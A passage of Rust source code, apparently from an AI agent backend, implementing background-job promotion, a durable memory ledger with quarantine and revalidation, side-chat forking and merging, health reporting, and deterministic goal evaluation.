            kind: UiEventKind::Custom(json!({
                "kind": kind,
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    // --- Stage 4: durable-thread lifecycle + Initialize + background promotion ---

    /// Open a durable-thread writer (Stage 4 four-verb lifecycle) over a session's
    /// event log. Appended items are lazy until an explicit `flush` / `persist` /
    /// `shutdown`; `discard` drops them without a durable write. Wrap it in a
    /// [`crate::live_thread::LiveThreadInitGuard`] to make a failed session init
    /// discard its partial event stream.
    pub fn open_live_thread(&self, session: SessionId) -> LiveThread {
        LiveThread::open(session, self.services.event_log.clone())
    }

    /// Handle a client Initialize (Stage 4 capability negotiation, Codex mechanism
    /// 5). Records the connection's negotiated `capabilities` (the experimental-api
    /// gate + the opt-out notification method set) keyed by `connection_id`, and
    /// returns the server-info reply. The stored capabilities are consulted in the
    /// notification emit path ([`Self::notification_for_connection`]). The
    /// `ClientInfo` is accepted per the handshake but not retained (only the
    /// negotiation levers drive server behavior). Model-free.
    pub fn initialize(
        &self,
        connection_id: impl Into<String>,
        _client: ClientInfo,
        capabilities: ClientCapabilities,
    ) -> InitializeResponse {
        self.connections.initialize(connection_id, capabilities);
        InitializeResponse {
            user_agent: format!("hide-backend/{}", env!("CARGO_PKG_VERSION")),
            workspace_root: self.services.config.workspace_root.display().to_string(),
            platform_family: std::env::consts::FAMILY.to_string(),
            platform_os: std::env::consts::OS.to_string(),
        }
    }

    /// The per-connection capability registry (Stage 4 Initialize handshake). The
    /// notification emit path consults it to suppress opted-out methods.
    pub fn connections(&self) -> &ConnectionRegistry {
        &self.connections
    }

    /// Promote a LIVE interactive run to a durable BACKGROUND JOB (Stage 4
    /// background promotion) WITHOUT restarting it: the still-running run keeps its
    /// `run_id` and its tokio task, so it survives a client disconnect. A durable
    /// [`JobRecord`] bound to that run id is created (status `Running`, a Manual
    /// wake trigger), so a fresh host recovers it and a reconnecting client can
    /// find, inspect, steer, pause, stop, fork, and resume-in-foreground the SAME
    /// run. Also appends a `run.promoted` event tying the run to the job on the
    /// session log. Reuses `job_create` (never a second store); model-free.
    pub async fn promote_run_to_background(
        &self,
        run_id: RunId,
        session: SessionId,
        goal_id: Option<String>,
        budget: Budget,
    ) -> Result<JobRecord> {
        let mut job =
            JobRecord::pending(session.clone(), vec![Trigger::Manual], budget).with_run(run_id.as_str());
        // The run is already executing: the promoted job is Running, not Pending.
        job.status = JobStatus::Running;
        if let Some(goal) = goal_id {
            job = job.with_goal(goal);
        }
        // Reuse the durable job path (writes the record + a `job.created` event +
        // publishes `job_created`), then tie the run to the job on the log.
        let job = self.job_create(job).await?;
        self.services
            .event_log
            .append(
                NewEvent::system(
                    session,
                    "run.promoted",
                    json!({ "run_id": run_id.as_str(), "job_id": job.job_id }),
                )
                .with_run(run_id.clone()),
            )
            .await?;
        self.publish_job(&job, "job_promoted");
        Ok(job)
    }

    /// The durable background job bound to a live `run_id`, if the run was promoted
    /// (Stage 4). Deterministic scan of the durable job store; survives a restart
    /// because the binding lives in the persisted [`JobRecord::run_id`].
    pub fn background_job_for_run(&self, run_id: &RunId) -> Option<JobRecord> {
        self.job_list()
            .into_iter()
            .find(|job| job.run_id.as_deref() == Some(run_id.as_str()))
    }

    /// Inspect the ARTIFACTS a background job accumulated (Stage 4 inspect): the
    /// durable job record, the run's own events replayed from the session log
    /// (filtered to the promoted `run_id`), and the checkpoints pinned on its
    /// session. A read-only, model-free projection a reconnecting client uses to
    /// see what the background run produced while it was detached. Errors if
    /// `job_id` is unknown.
    pub async fn background_job_artifacts(&self, job_id: &str) -> Result<Value> {
        let job = self.job_get(job_id).ok_or_else(|| {
            hide_core::error::HideError::Message(format!(
                "background_job_artifacts: no such job '{job_id}'"
            ))
        })?;
        let run_id = job.run_id.clone();
        let run_events: Vec<Event> = self
            .services
            .event_log
            .scan(Some(job.session_id.clone()), None, None)
            .await?
            .into_iter()
            .filter(|e| {
                run_id
                    .as_deref()
                    .map(|r| e.run_id.as_ref().map(|er| er.as_str()) == Some(r))
                    .unwrap_or(false)
            })
            .collect();
        let checkpoints = self.checkpoint_list(&job.session_id);
        Ok(json!({
            "job": job,
            "run_events": run_events,
            "checkpoints": checkpoints,
        }))
    }

    /// Resume a promoted background job IN THE FOREGROUND (Stage 4): the
    /// reconnecting client reattaches to the still-running run. Clears any buffered
    /// pause on the run (the run continues, mirroring `ResumeRun`), flips the job
    /// status back to `Running`, appends a durable `run.resumed_foreground` event,
    /// republishes the session projection so the reattached client re-renders the
    /// transcript it missed, and returns `(job, projection)`. Errors if the job is
    /// unknown or was never bound to a run. Model-free.
    pub async fn resume_background_job_in_foreground(
        &self,
        job_id: &str,
    ) -> Result<(JobRecord, SessionProjection)> {
        let job = self.job_get(job_id).ok_or_else(|| {
            hide_core::error::HideError::Message(format!(
                "resume_background_job_in_foreground: no such job '{job_id}'"
            ))
        })?;
        let run_id = job.run_id.clone().ok_or_else(|| {
            hide_core::error::HideError::Message(format!(
                "resume_background_job_in_foreground: job '{job_id}' is not bound to a run"
            ))
        })?;
        // Continue the run: clear any buffered pause (same as ResumeRun).
        self.interrupts.clear(&RunId::from(run_id.as_str()));
        // The job is foregrounded and active again.
        let job = self
            .job_update_status(job_id, JobStatus::Running, None)
            .await?
            .unwrap_or(job);
        // Durable foreground-resume marker on the run's session log.
        self.services
            .event_log
            .append(
                NewEvent::system(
                    job.session_id.clone(),
                    "run.resumed_foreground",
                    json!({ "run_id": run_id, "job_id": job.job_id }),
                )
                .with_run(RunId::from(run_id.as_str())),
            )
            .await?;
        // Replay: rebuild + return the projection so the reattached client
        // re-renders the transcript it missed while detached.
        let projection = self
            .rebuild_session_projection(job.session_id.clone())
            .await?;
        self.publish_job(&job, "job_resumed_foreground");
        Ok((job, projection))
    }

    /// Dispatch a Stage 4 background-promotion custom intent to the corresponding
    /// host method (mirrors [`Self::handle_memory_workspace_env_intent`]). Payload
    /// shapes:
    ///
    /// * `promote_run`           -> `{ run_id, session_id, goal_id?, budget? }`
    /// * `resume_run_foreground` -> `{ job_id }`
    async fn handle_background_intent(&self, name: &str, payload: &Value) -> Result<()> {
        let missing = |field: &str| {
            hide_core::error::HideError::Message(format!("{name}: missing '{field}'"))
        };
        match name {
            "promote_run" => {
                let run_id = payload
                    .get("run_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("run_id"))?;
                let session = payload
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("session_id"))?;
                let goal_id = payload
                    .get("goal_id")
                    .and_then(|v| v.as_str())
                    .map(str::to_string);
                let budget = payload
                    .get("budget")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                self.promote_run_to_background(
                    RunId::from(run_id),
                    SessionId::from(session),
                    goal_id,
                    budget,
                )
                .await?;
            }
            "resume_run_foreground" => {
                let job_id = payload
                    .get("job_id")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| missing("job_id"))?;
                self.resume_background_job_in_foreground(job_id).await?;
            }
            _ => {}
        }
        Ok(())
    }

    // --- Outcome-governed durable MEMORY + revalidation (bible sec 21-22, sec 78.1 #16) ---

    /// Add a durable, provenance-carrying MEMORY record (bible sec 21-22). The
    /// record is minted `Active` at the neutral outcome score from the `draft`
    /// (scope + claim + source + author + citations + privacy + optional expiry)
    /// and written to the KV `memory` namespace keyed by its minted id, so it
    /// survives a workspace reopen. Returns the stored record (with its id).
    pub fn memory_add(&self, draft: MemoryDraft) -> Result<MemoryRecord> {
        let record = MemoryRecord::from_draft(draft);
        MemoryLedger::put(&self.services.key_value_store, &record)?;
        Ok(record)
    }

    /// The durable memory record with `memory_id`, if any.
    pub fn memory_get(&self, memory_id: &str) -> Option<MemoryRecord> {
        MemoryLedger::get(&self.services.key_value_store, memory_id)
    }

    /// Every memory record BOUND to `scope`, ordered deterministically (created_ms
    /// then id). Scope equality is by value, so a `Repo` list never returns a
    /// `Session` or `User` record. Returns every status (Active / Quarantined /
    /// Superseded); use [`Self::memory_context`] for the context-eligible subset.
    pub fn memory_list(&self, scope: &MemoryScope) -> Vec<MemoryRecord> {
        MemoryLedger::list_scope(&self.services.key_value_store, scope)
    }

    /// The records in `scope` that are eligible to ENTER CONTEXT: `Active` and not
    /// expired. This is the only set the context compiler should draw from (bible
    /// sec 21-22): a quarantined or superseded or expired claim never re-enters.
    pub fn memory_context(&self, scope: &MemoryScope) -> Vec<MemoryRecord> {
        let now = hide_core::ids::now_ms();
        MemoryLedger::list_scope(&self.services.key_value_store, scope)
            .into_iter()
            .filter(|record| record.is_eligible(now))
            .collect()
    }

    /// SUPERSEDE a record with a replacement (bible sec 21-22) WITHOUT erasing
    /// history: the old record is marked `Superseded` and linked to the new one
    /// (`superseded_by`), the new record links back (`supersedes`), and BOTH are
    /// persisted. The old record stays in the ledger (queryable, auditable); it is
    /// simply no longer context-eligible. Returns `(old_superseded, new_active)`.
    /// `NotFound` when `old_id` is unknown.
    pub fn memory_supersede(
        &self,
        old_id: &str,
        replacement: MemoryDraft,
    ) -> Result<(MemoryRecord, MemoryRecord)> {
        let kv = &self.services.key_value_store;
        let mut old = MemoryLedger::get(kv, old_id).ok_or_else(|| {
            hide_core::error::HideError::NotFound(format!("unknown memory record {old_id}"))
        })?;
        let mut new = MemoryRecord::from_draft(replacement);
        new.supersedes = Some(old.memory_id.clone());
        old.status = MemoryStatus::Superseded;
        old.superseded_by = Some(new.memory_id.clone());
        // Write the new record first, then the retired old one, so a crash between
        // the two never leaves the old record pointing at a nonexistent successor.
        MemoryLedger::put(kv, &new)?;
        MemoryLedger::put(kv, &old)?;
        Ok((old, new))
    }

    /// Record an OUTCOME of exercising a memory claim (bible sec 21-22
    /// governance). A success raises the record's `outcome_score` and `use_count`;
    /// a failure lowers the score and, once it falls below the quarantine floor,
    /// flips the record to `Quarantined` so it stops entering context. The updated
    /// record is persisted and returned. `NotFound` when `memory_id` is unknown.
    pub fn memory_record_outcome(&self, memory_id: &str, success: bool) -> Result<MemoryRecord> {
        let kv = &self.services.key_value_store;
        let mut record = MemoryLedger::get(kv, memory_id).ok_or_else(|| {
            hide_core::error::HideError::NotFound(format!("unknown memory record {memory_id}"))
        })?;
        record.record_outcome(success);
        MemoryLedger::put(kv, &record)?;
        Ok(record)
    }

    /// REVALIDATE a memory record (or a whole scope) against the CURRENT repo on
    /// disk (bible sec 21-22). For each `Active` target record, every citation is
    /// checked with [`crate::memory::resolve_citation`]: a cited `path` must exist,
    /// and a `path#symbol` file must exist AND contain the symbol via a lexical
    /// scan. A record with an unresolved citation is QUARANTINED (durably) with a
    /// reason; a record whose citations all still resolve keeps its status and has
    /// its `last_validated_ms` bumped. Non-`Active` records are reported but not
    /// mutated.
    ///
    /// This is deterministic and MODEL-FREE. SEMANTIC revalidation -- judging
    /// whether a claim is still true in spirit even when its citations resolve --
    /// is `DEFERRED_MODEL_REQUIRED`: no model is ever loaded or called here.
    ///
    /// Returns one [`MemoryRevalidation`] verdict per record considered. A
    /// `RevalidateTarget::Record` with an unknown id errors `NotFound`; an empty
    /// scope returns an empty vec.
    pub fn memory_revalidate(
        &self,
        target: RevalidateTarget,
        repo_root: &std::path::Path,
    ) -> Result<Vec<MemoryRevalidation>> {
        let kv = &self.services.key_value_store;
        let records: Vec<MemoryRecord> = match target {
            RevalidateTarget::Record(memory_id) => {
                let record = MemoryLedger::get(kv, &memory_id).ok_or_else(|| {
                    hide_core::error::HideError::NotFound(format!(
                        "unknown memory record {memory_id}"
                    ))
                })?;
                vec![record]
            }
            RevalidateTarget::Scope(scope) => MemoryLedger::list_scope(kv, &scope),
        };

        let now = hide_core::ids::now_ms();
        let mut out = Vec::with_capacity(records.len());
        for mut record in records {
            let unresolved: Vec<String> = record
                .citations
                .iter()
                .map(|citation| crate::memory::resolve_citation(repo_root, citation))
                .filter(|resolution| !resolution.resolved)
                .map(|resolution| resolution.citation)
                .collect();
            let resolved = unresolved.is_empty();
            // Only an Active record transitions; a Quarantined/Superseded record is
            // reported but never re-mutated by a revalidation pass.
            let was_active = record.status == MemoryStatus::Active;
            let mut quarantined = false;
            if was_active && !resolved {
                record.status = MemoryStatus::Quarantined;
                record.last_validated_ms = now;
                quarantined = true;
                MemoryLedger::put(kv, &record)?;
            } else if was_active && resolved {
                record.last_validated_ms = now;
                MemoryLedger::put(kv, &record)?;
            }
            let reason = if resolved {
                "all citations resolve against the repo on disk".to_string()
            } else {
                format!(
                    "citation(s) no longer resolve: {}",
                    unresolved.join(", ")
                )
            };
            out.push(MemoryRevalidation {
                memory_id: record.memory_id,
                status: record.status,
                resolved,
                unresolved,
                reason,
                quarantined,
            });
        }
        Ok(out)
    }

    /// Side-chat lifecycle (bible sec 32-33, sec 78.1 #9) -- CREATE. Fork a
    /// [`SessionRelationship::SideChat`] from `parent_session` at `at_event`
    /// (`None` = the parent's current tail), recorded READ-ONLY by default with
    /// ancestry preserved. When `inherit` is true the side chat sees the
    /// pre-boundary history; when false it starts empty (ancestry only). The
    /// parent is UNTOUCHED (independent lineage). Surfaces a `side_chat_created`
    /// UiEvent under the new session id.
    pub async fn create_side_chat(
        &self,
        parent_session: SessionId,
        at_event: Option<&EventId>,
        inherit: bool,
    ) -> Result<(SessionId, crate::services::SessionRecord, SessionProjection)> {
        let (new_session, record, projection) = branch_and_record(
            &self.replay,
            &self.services.sessions,
            &self.services.key_value_store,
            parent_session,
            at_event.cloned(),
            crate::services::SessionRelationship::SideChat,
            true, // read-only by default
            inherit,
        )
        .await?;
        self.publish_side_chat_created(&new_session, &record);
        Ok((new_session, record, projection))
    }

    /// Side-chat lifecycle -- MERGE. Append a durable `session.merge_summary`
    /// event ONTO THE PARENT session, carrying the `side_chat` id + the typed
    /// `summary_text`. The parent's transcript gains a cited summary (a
    /// parent-scoped [`Self::search_transcript`] surfaces it); the side chat is
    /// NOT destroyed -- its own event lineage is left entirely intact. Surfaces a
    /// `side_chat_merged` UiEvent under the parent. Returns the appended event.
    ///
    /// Discarding a side chat is simply the absence of this call: with no merge,
    /// nothing is appended and the parent stays exactly as it was.
    pub async fn merge_side_chat_summary(
        &self,
        side_chat: SessionId,
        parent: SessionId,
        summary_text: impl Into<String>,
    ) -> Result<Event> {
        self.merge_side_chat_result(side_chat, parent, SideChatResult::summary_only(summary_text))
            .await
    }

    /// Side-chat lifecycle -- MERGE a CONCISE TYPED result (bible sec 32-33, sec
    /// 78.1 #9). Append a durable `session.merge_summary` event ONTO THE PARENT
    /// carrying the side chat id + the typed [`SideChatResult`] (summary + cited
    /// `evidence` links + `kind`). The parent gains this BOUNDED result, NEVER the
    /// child's full transcript; the side chat's own lineage is left entirely
    /// intact. `summary` stays at the payload top level so a parent-scoped
    /// [`Self::search_transcript`] surfaces the cited summary. Surfaces a
    /// `side_chat_merged` UiEvent under the parent. Returns the appended event.
    pub async fn merge_side_chat_result(
        &self,
        side_chat: SessionId,
        parent: SessionId,
        result: SideChatResult,
    ) -> Result<Event> {
        let event = self
            .services
            .event_log
            .append(NewEvent::system(
                parent.clone(),
                "session.merge_summary",
                result.merge_event_payload(&side_chat),
            ))
            .await?;
        self.publish_side_chat_merged(&parent, &side_chat, &result, event.seq);
        Ok(event)
    }

    /// Publish a `side_chat_created` UiEvent carrying the new thread's record,
    /// under the new session id (mirrors [`Self::publish_session_forked`]).
    fn publish_side_chat_created(
        &self,
        new_session: &SessionId,
        record: &crate::services::SessionRecord,
    ) {
        self.ui_bus.publish(UiEvent {
            seq: record.forked_at.unwrap_or(0),
            session_id: Some(new_session.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "side_chat_created",
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    /// Publish a `side_chat_merged` UiEvent under the PARENT (the merge lands on
    /// the parent, not the side chat), carrying both ids + the merged summary.
    fn publish_side_chat_merged(
        &self,
        parent: &SessionId,
        side_chat: &SessionId,
        result: &SideChatResult,
        seq: u64,
    ) {
        self.ui_bus.publish(UiEvent {
            seq,
            session_id: Some(parent.clone()),
            kind: UiEventKind::Custom(result.merged_ui_payload(parent, side_chat)),
        });
    }

    /// Perform a `create_side_chat` custom intent: spawn the side-chat creation so
    /// the intent ack returns immediately (mirrors [`Self::spawn_fork_session`]).
    /// A failure (e.g. an unknown boundary event) surfaces as an Error UiEvent.
    fn spawn_create_side_chat(
        &self,
        parent: SessionId,
        at_event: Option<EventId>,
        inherit: bool,
    ) {
        let replay = self.replay.clone();
        let sessions = self.services.sessions.clone();
        let kv = self.services.key_value_store.clone();
        let bus = Arc::clone(&self.ui_bus);
        tokio::spawn(async move {
            match branch_and_record(
                &replay,
                &sessions,
                &kv,
                parent.clone(),
                at_event,
                crate::services::SessionRelationship::SideChat,
                true,
                inherit,
            )
            .await
            {
                Ok((new_session, record, _)) => {
                    bus.publish(UiEvent {
                        seq: record.forked_at.unwrap_or(0),
                        session_id: Some(new_session),
                        kind: UiEventKind::Custom(json!({
                            "kind": "side_chat_created",
                            "record": serde_json::to_value(&record).unwrap_or_else(|_| json!({})),
                        })),
                    });
                }
                Err(err) => {
                    bus.publish(UiEvent {
                        seq: 0,
                        session_id: Some(parent),
                        kind: UiEventKind::Error {
                            code: "create_side_chat".to_string(),
                            message: err.to_string(),
                        },
                    });
                }
            }
        });
    }

    /// Perform a `merge_side_chat` custom intent: append the merge summary onto
    /// the parent (spawned; the ack returns immediately). Surfacing is done by
    /// [`Self::merge_side_chat_summary`]; a failure surfaces as an Error UiEvent.
    fn spawn_merge_side_chat(&self, side_chat: SessionId, parent: SessionId, summary: String) {
        let event_log = self.services.event_log.clone();
        let bus = Arc::clone(&self.ui_bus);
        let result = SideChatResult::summary_only(summary);
        tokio::spawn(async move {
            let appended = event_log
                .append(NewEvent::system(
                    parent.clone(),
                    "session.merge_summary",
                    result.merge_event_payload(&side_chat),
                ))
                .await;
            match appended {
                Ok(event) => {
                    bus.publish(UiEvent {
                        seq: event.seq,
                        session_id: Some(parent.clone()),
                        kind: UiEventKind::Custom(result.merged_ui_payload(&parent, &side_chat)),
                    });
                }
                Err(err) => {
                    bus.publish(UiEvent {
                        seq: 0,
                        session_id: Some(parent),
                        kind: UiEventKind::Error {
                            code: "merge_side_chat".to_string(),
                            message: err.to_string(),
                        },
                    });
                }
            }
        });
    }

    /// Publish a `session_forked` UiEvent carrying the new thread's record, under
    /// the new session id (so the FE, which adopts a session off any event's
    /// `session_id`, switches to the fork).
    fn publish_session_forked(&self, new_session: &SessionId, record: &crate::services::SessionRecord) {
        self.ui_bus.publish(UiEvent {
            seq: record.forked_at.unwrap_or(0),
            session_id: Some(new_session.clone()),
            kind: UiEventKind::Custom(json!({
                "kind": "session_forked",
                "record": serde_json::to_value(record).unwrap_or_else(|_| json!({})),
            })),
        });
    }

    /// Perform a `ForkSession` intent: fork the source at the event boundary,
    /// record ancestry, and surface the new thread. Spawned so the intent ack
    /// returns immediately (mirrors [`Self::spawn_open_session`]); a failure (e.g.
    /// an unknown boundary event) surfaces as an Error UiEvent, never a panic.
    fn spawn_fork_session(&self, from: SessionId, at_event: hide_core::ids::EventId) {
        let replay = self.replay.clone();
        let sessions = self.services.sessions.clone();
        let kv = self.services.key_value_store.clone();
        let bus = Arc::clone(&self.ui_bus);
        tokio::spawn(async move {
            match fork_and_record(&replay, &sessions, &kv, from.clone(), Some(at_event)).await {
                Ok((new_session, record, _)) => {
                    bus.publish(UiEvent {
                        seq: record.forked_at.unwrap_or(0),
                        session_id: Some(new_session),
                        kind: UiEventKind::Custom(json!({
                            "kind": "session_forked",
                            "record": serde_json::to_value(&record).unwrap_or_else(|_| json!({})),
                        })),
                    });
                }
                Err(err) => {
                    bus.publish(UiEvent {
                        seq: 0,
                        session_id: Some(from),
                        kind: UiEventKind::Error {
                            code: "fork_session".to_string(),
                            message: err.to_string(),
                        },
                    });
                }
            }
        });
    }

    pub async fn status(&self) -> BackendStatus {
        BackendStatus {
            workspace_root: self.services.config.workspace_root.clone(),
            capabilities: self.services.capabilities.clone(),
            connectors: self.connectors.statuses().await,
            tools: self.tools.specs(),
            model_roles: self.services.role_registry.all(),
            runtime: self.runtime_state(),
        }
    }

    pub async fn health(&self) -> HealthReport {
        let mut checks = Vec::new();
        let layout = self.services.layout();
        checks.push(path_check("hide_dir", &layout.hide_dir));
        checks.push(path_check("event_log", &layout.event_log));
        checks.push(path_check("blobs", &layout.blobs));
        checks.push(path_check("projections", &layout.projections));
        checks.push(path_check("kv", &layout.kv));
        checks.push(count_check("tools", self.tools.specs().len()));
        checks.push(count_check(
            "model_roles",
            self.services.role_registry.all().len(),
        ));
        for connector in self.connectors.statuses().await {
            checks.push(HealthCheck {
                name: format!("connector:{}", connector.id),
                status: if connector.healthy {
                    HealthStatus::Ok
                } else {
                    HealthStatus::Failed
                },
                detail: connector.detail,
            });
        }
        // Surface the runtime supervisor state so the FE's RuntimeStatus
        // reflects down/booting/ready/degraded/failed. When NO model is
        // configured (the headless default) the runtime is simply absent and we
        // report `Ok` with a "not configured" note: a missing model is not a
        // health failure of the host. A configured-but-not-ready runtime maps to
        // Degraded (still booting) or Failed (crashed past its restart cap).
        let (rt_status, rt_detail) = match self.runtime_state() {
            None => (HealthStatus::Ok, "not configured".to_string()),
            Some(RuntimeSupervisorState::Ready) => (HealthStatus::Ok, "ready".to_string()),
            Some(RuntimeSupervisorState::Failed) => (HealthStatus::Failed, "failed".to_string()),
            Some(other) => (HealthStatus::Degraded, format!("{other:?}").to_lowercase()),
        };
        checks.push(HealthCheck {
            name: "runtime".to_string(),
            status: rt_status,
            detail: rt_detail,
        });
        let status = if checks
            .iter()
            .any(|check| check.status == HealthStatus::Failed)
        {
            HealthStatus::Failed
        } else if checks
            .iter()
            .any(|check| check.status == HealthStatus::Degraded)
        {
            HealthStatus::Degraded
        } else {
            HealthStatus::Ok
        };
        HealthReport {
            component: "hide-backend".to_string(),
            status,
            checks,
        }
    }
}

/// Shared BRANCH-by-event core: resolve a boundary, mint a fresh INDEPENDENT
/// lineage, and durably record ANCESTRY with an explicit relationship + read-only
/// flag -- WITHOUT publishing (the caller owns surfacing). Used by the fork path
/// ([`fork_and_record`]) and the side-chat path
/// ([`BackendHost::create_side_chat`]).
///
/// An explicit `at_event` resolves strictly (`NotFound` if it is absent from the
/// source); `None` branches the whole session (its current tail). When `inherit`
/// is true the source prefix up to the boundary is copied forward into the new
/// lineage (the fork/side-chat sees the pre-boundary history); when false the new
/// session starts empty, with only its ANCESTRY (parent + boundary) recorded.
///
/// Ancestry lives in the KV `session_records` namespace, NOT the new session's
/// own event log, so it never pollutes the transcript and survives a reopen.
#[allow(clippy::too_many_arguments)]
async fn branch_and_record(
    replay: &BackendReplayService,
    sessions: &Arc<crate::services::SessionRegistry>,
    kv: &hide_core::persistence::DynKeyValueStore,
    from: SessionId,
    at_event: Option<EventId>,
    relationship: crate::services::SessionRelationship,
    read_only: bool,
    inherit: bool,
) -> Result<(SessionId, crate::services::SessionRecord, SessionProjection)> {
    let at_seq = match &at_event {
        Some(id) => replay.seq_of_event(from.clone(), id).await?,
        None => replay.latest_seq(from.clone()).await?,
    };
    let (new_session, projection) = if inherit {
        // Copy the source prefix forward under a fresh session id (independent).
        replay.fork_session(from.clone(), at_seq).await?
    } else {
        // A fresh, empty branch: mint a new id and build its (empty) projection
        // without carrying any prefix; nothing is appended to any log.
        let new_session = SessionId::new();
        let projection = replay.rebuild_session(new_session.clone()).await?;
        (new_session, projection)
    };
    let record = crate::services::SessionRecord::branch(
        new_session.clone(),
        from,
        at_seq,
        at_event,
        relationship,
        read_only,
    );
    sessions.record_session(kv, &record);
    Ok((new_session, record, projection))
}

/// Shared fork-by-event core (used by both the direct
/// [`BackendHost::fork_session_from_event`] method and the spawned `ForkSession`
/// intent path): a read/write [`SessionRelationship::Fork`] that inherits the
/// source prefix. Delegates to [`branch_and_record`].
async fn fork_and_record(
    replay: &BackendReplayService,
    sessions: &Arc<crate::services::SessionRegistry>,
    kv: &hide_core::persistence::DynKeyValueStore,
    from: SessionId,
    at_event: Option<EventId>,
) -> Result<(SessionId, crate::services::SessionRecord, SessionProjection)> {
    branch_and_record(
        replay,
        sessions,
        kv,
        from,
        at_event,
        crate::services::SessionRelationship::Fork,
        false,
        true,
    )
    .await
}

/// DETERMINISTIC, model-free evaluation of a [`GoalRecord`] against the durable
/// `verify.result` evidence in a session's event log (bible sec 14). The evidence
/// read is EXACTLY the session's verification receipts: each `verify.result` event
/// carries a [`Verdict`](hide_kernel::verify::oracle::Verdict); we take the LATEST
/// verdict per oracle (log order == seq order) and the overall latest.
///
/// * STRUCTURED acceptance (oracle names present): every named oracle must have a
///   latest verdict of `Pass` -> `Met`; a missing or non-`Pass` oracle -> `NotMet`
///   with the reason. The consulted verdict event ids are the returned evidence.
/// * No acceptance, but a recognized verification `condition` ([`is_verification_condition`]):
///   the session's latest verification verdict must be `Pass`.
/// * Otherwise (a natural-language condition, no structured acceptance): the
///   outcome is `DeferredModelRequired` -- a model would be needed to judge it, and
///   NO model is called here.
/// Parse a [`MemoryDraft`] out of a custom-intent Value (bible sec 21-22). Used by
/// the `memory_add` / `memory_supersede` dispatch arms. `MemoryDraft` intentionally
/// does not derive `Deserialize` (its id/score/status are derived, not supplied),
/// so the required provenance (scope + claim + source + author) is read explicitly
/// and the optional refinements are layered via the builder setters.
fn parse_memory_draft(payload: &Value) -> Result<MemoryDraft> {
    let field = |name: &str| {
        hide_core::error::HideError::Message(format!("memory draft: missing '{name}'"))
    };
    let scope: MemoryScope = serde_json::from_value(
        payload.get("scope").cloned().ok_or_else(|| field("scope"))?,
    )
    .map_err(|e| hide_core::error::HideError::Message(format!("memory draft: bad scope: {e}")))?;
    let claim = payload
        .get("claim")
        .and_then(|v| v.as_str())
        .ok_or_else(|| field("claim"))?;
    let source = payload
        .get("source")
        .and_then(|v| v.as_str())
        .ok_or_else(|| field("source"))?;
    let author = payload
        .get("author")
        .and_then(|v| v.as_str())
        .ok_or_else(|| field("author"))?;
    let mut draft = MemoryDraft::new(scope, claim, source, author);
    if let Some(confidence) = payload.get("confidence").and_then(|v| v.as_f64()) {
        draft = draft.with_confidence(confidence as f32);
    }
    if let Some(citations) = payload.get("citations").and_then(|v| v.as_array()) {
        draft = draft.with_citations(
            citations
                .iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect(),
        );
    }
    if let Some(invalidation) = payload.get("invalidation").and_then(|v| v.as_array()) {
        draft = draft.with_invalidation(
            invalidation
                .iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect(),
        );
    }
    if let Some(privacy) = payload.get("privacy") {
        let privacy: PrivacyClass = serde_json::from_value(privacy.clone()).map_err(|e| {
            hide_core::error::HideError::Message(format!("memory draft: bad privacy: {e}"))
        })?;
        draft = draft.with_privacy(privacy);
    }
    if let Some(expiry) = payload.get("expiry_ms").and_then(|v| v.as_u64()) {
        draft = draft.with_expiry_ms(Some(expiry));
    }
    Ok(draft)
}

fn evaluate_goal(goal: &GoalRecord, events: &[Event]) -> GoalVerdict {
    use hide_kernel::verify::oracle::{Verdict, VerdictStatus};

    // Latest verdict (+ its event id) per oracle, and the overall latest, walking
    // the log in seq order (`scan` already returns events seq-ordered).
    let mut latest_by_oracle: std::collections::HashMap<String, (Verdict, EventId)> =
        std::collections::HashMap::new();
    let mut overall_latest: Option<(Verdict, EventId)> = None;
    for event in events {
        if event.kind != "verify.result" {
            continue;
        }
        if let Some(verdict) = event.payload_as::<Verdict>() {
            overall_latest = Some((verdict.clone(), event.id.clone()));
            latest_by_oracle.insert(verdict.oracle.clone(), (verdict, event.id.clone()));
        }
    }

    let mk = |outcome, reason, evidence| GoalVerdict {
        goal_id: goal.goal_id.clone(),
        session_id: goal.session_id.clone(),
        outcome,
        reason,
        evidence,
    };

    if !goal.acceptance.is_empty() {
        // STRUCTURED path: every named oracle must have a latest verdict == Pass.
        let mut evidence = Vec::new();
        for oracle in &goal.acceptance {
            match latest_by_oracle.get(oracle) {
                None => {
                    return mk(
                        GoalOutcome::NotMet,
                        format!("no verification evidence yet for oracle '{oracle}'"),
                        evidence,
                    );
                }
                Some((verdict, id)) => {
                    evidence.push(id.clone());
                    if verdict.status != VerdictStatus::Pass {
                        return mk(
                            GoalOutcome::NotMet,
                            format!(
                                "oracle '{oracle}' did not pass (latest status: {:?}): {}",
                                verdict.status, verdict.detail
                            ),
                            evidence,
                        );
                    }
                }
            }
        }
        return mk(
            GoalOutcome::Met,
            format!("all {} acceptance oracle(s) passed", goal.acceptance.len()),
            evidence,
        );
    }

    // No structured acceptance: fall back to the session's latest verification
    // verdict, but only when the condition reads as a verification condition.
    if is_verification_condition(&goal.condition) {
        match overall_latest {
            None => mk(
                GoalOutcome::NotMet,
                "no verification evidence yet for this session".to_string(),
                Vec::new(),
            ),
            Some((verdict, id)) => {
                let evidence = vec![id];
                if verdict.status == VerdictStatus::Pass {
                    mk(
                        GoalOutcome::Met,
                        format!("latest verification verdict passed (oracle '{}')", verdict.oracle),
                        evidence,
                    )
                } else {
                    mk(
                        GoalOutcome::NotMet,
                        format!(
                            "latest verification verdict did not pass (oracle '{}', status {:?})",
                            verdict.oracle, verdict.status
                        ),
                        evidence,
                    )
                }
            }
        }
    } else {
        mk(
            GoalOutcome::DeferredModelRequired,
            "natural-language condition requires a model to judge \
             (deferred_model_required); no model was called"
                .to_string(),
            Vec::new(),
        )
    }
}

/// Whether a goal `condition` reads as a recognized deterministic VERIFICATION
/// condition -- one evaluable model-free against `verify.result` evidence (e.g.
/// `"tests_pass"`, `"verify green"`). Everything else is a natural-language
/// condition (`DEFERRED_MODEL_REQUIRED`). Case/separator-insensitive.
fn is_verification_condition(condition: &str) -> bool {
    let norm = condition.trim().to_lowercase().replace([' ', '-'], "_");
